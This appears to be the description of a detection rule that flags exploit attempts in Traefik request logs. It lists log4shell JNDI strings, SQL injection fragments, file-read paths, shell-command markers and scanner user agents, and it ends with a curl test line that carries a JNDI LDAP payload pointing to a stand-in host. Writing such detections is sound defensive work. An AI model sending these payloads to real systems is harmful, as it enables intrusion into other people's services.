description = ATT&CK v20 T1190 (Initial Access), strategy none. A request to Traefik carried an exploit payload in its path or query (JNDI/log4shell, ${ } template expressions, <script>, SQL injection such as UNION SELECT or ' or 1=1, /etc/passwd or win.ini, php://, cmd= parameters, shell commands, a NUL byte) or a scanner's user agent (sqlmap, nuclei, zgrab, masscan, nikto, nmap, ffuf, wpscan and others). Only the path, query, User-Agent and Referer are logged, so a payload in another header or the body is not seen. A 4xx status means the request was refused or failed; a 2xx means a backend accepted it and is worth checking first. Test: from a tailnet client: curl -sk -g 'https://splunk.bmosan.com/?q=${jndi:ldap://hl-test.invalid/a}'
